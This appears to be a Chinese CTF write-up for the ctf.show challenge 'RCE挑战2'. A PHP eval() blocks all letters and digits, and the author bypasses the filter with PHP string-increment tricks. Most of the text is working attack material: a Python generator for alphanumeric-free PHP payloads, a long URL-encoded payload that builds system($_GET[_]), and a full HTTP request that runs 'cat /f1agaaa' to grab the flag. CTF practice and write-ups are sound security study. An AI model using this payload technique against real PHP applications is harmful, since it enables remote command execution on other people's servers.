# RCE挑战2

[题目地址](https://ctf.show/challenges#RCE%E6%8C%91%E6%88%982-3917)

小菜狗卡了几个小时，终于做出来了。这题说难也不难，说简单也不简单，不过给了我一个很深刻的教训。

```php
<?php
//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。
error_reporting(0);
highlight_file(__FILE__);

if (isset($_POST['ctf_show'])) {
    $ctfshow = $_POST['ctf_show'];
    if (is_string($ctfshow)) {
        if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$ctfshow)){
            eval($ctfshow);
        }else{
            echo("Are you hacking me AGAIN?");
        }
    }else{
        phpinfo();
    }
}
?>
```

过滤再离谱一点吧，干脆啥也不给最好，我们一起幻想getshell（doge）。这题把全字母全数字还有一些符号都禁了，看起来根本调用不了函数。注释里给了提示，去看看那道题的[wp](https://blog.csdn.net/weixin_46250265/article/details/119791617)。那题也挺离谱的，只剩下C和0-3，但是还是没有这道离谱，真就啥也不给。不过我根据自增rce这条线索搜索，查到了p神的一篇[文章](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)，完全可以直接用。原理是php的一个特性，试想下面这个场景：

```php
$a='A';
$a++;
echo $a;
$a_='a';
$a_++;
echo $a_;
```

请问此时的`$a`和`$a_`分别是啥？答案是B和b。由此我们可以知道，只要得到字母A或者a，就能通过自增的方式得到剩下的字母。不过注意大写字母是没法自增到小写字母的，反之亦然。有一招来变出大写A。

```php
$_=[];
$_=''.$_; // $_='Array';
$_=$_['('==')']; // $_=$_[0];
$___=$_; // A
```

首先我们将`$_`赋值为一个数组，然后将其用字符串连接符`.`与空字符相接。这时候数组就会被强行转为字符串，变成Array。接下来`'('==')'`结果为0，取出第一个字符，也就是A。知道这点就能开始构造payload。手写有亿点累，于是我写了个垃圾脚本。

```python
from string import ascii_uppercase
from urllib.parse import quote_plus
result=''
names=[]
def print_start(sign1,sign2):
    global result
    result+=f"$_=[];$_=''.$_;$_=$_['{sign1}'=='{sign2}'];"
def get_context():
    print("请输入不在过滤内的两个不同符号")
    sign1=input("符号1: ")
    sign2=input("符号2: ")
    print_start(sign1,sign2)
def get_command(name):
    global result
    command=input("要执行的函数为（不带小括号）: ").upper().replace('\n','')
    for char in command:
        result+=f"$__=$_;"
        for i in range(ord(char)-ord('A')):
            result+=f"$__++;"
        result+=f"{name}.=$__;"
def do_get_param(param,name):
    global result
    for a in param:
        if a in ascii_uppercase:
            result+=f"$__=$_;"
            for i in range(ord(a)-ord('A')):
                result+=f"$__++;"
            result+=f"{name}.=$__;"
        else:
            result+=f"{name}.='{a}';"
def get_param(name):
    param=input("请输入最后一个函数的参数,该参数固定为大写: ").upper().replace('\n','')
    if param=="_GET[_]":
        do_get_param(param[:4],name)
    else:
        do_get_param(param,name)
    return param
def print_last(param):
    global result
    if not param=="_GET[_]":
        for i in range(len(names)-1):
            result+=f"{names[i]}("
        result+=f"{names[-1]+')'*(len(names)-1)};"
    else:
        result+=f"$_=${names[-1]};"
        for i in range(len(names)-1):
            result+=f"{names[i]}("
        result+=f"$_[_]{')'*(len(names)-1)};"
def generate_payload():
    get_func_num()
    for i in range(len(names)-1):
        get_command(names[i])
    return get_param(names[-1])
def get_func_num():
    num=int(input("请输入需要多少层的函数嵌套: "))
    for i in range(num+1):
        names.append('$___'+i*"_")
def get_result():
    isURL=int(input("是否使用url编码?0/1: "))
    if not isURL:
        print(result)
    else:
        print(quote_plus(result))
get_context()
param=generate_payload()
print_last(param)
get_result()
```

之前没有url编码发送post，结果明明自己测可以的payload到远程就不行。我百思不得其解，后来用题目自带的phpinfo看了下，原来我的payload中的++被url编码解释成空格了。我以为只有get需要url编码，其实get和post都要的。看基础不好就是这个下场，这块卡了几个小时。用脚本生成payload。

```
请输入不在过滤内的两个不同符号
符号1:  (
符号2: )
请输入需要多少层的函数嵌套: 1     
要执行的函数为（不带小括号）: system
请输入最后一个函数的参数,该参数固定为大写: _get[_]
是否使用url编码?0/1: 1

%24_%3D%5B%5D%3B%24_%3D%27%27.%24_%3B%24_%3D%24_%5B%27%28%27%3D%3D%27%29%27%5D%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____.%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B
```

先执行`ls /`得知flag文件名字`/f1agaaa`，最后cat。

```
POST /?_=cat+/f1agaaa; HTTP/1.1
Host: d48ecfed-9870-41c6-ab0f-87f2a0dac873.challenge.ctf.show
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 2193

ctf_show=%24_%3D%5B%5D%3B%24_%3D%27%27.%24_%3B%24_%3D%24_%5B%27%28%27%3D%3D%27%29%27%5D%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____.%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B
```

## Flag
> ctfshow{c2ddb47f-a898-4c46-aa3f-218dcc427e88}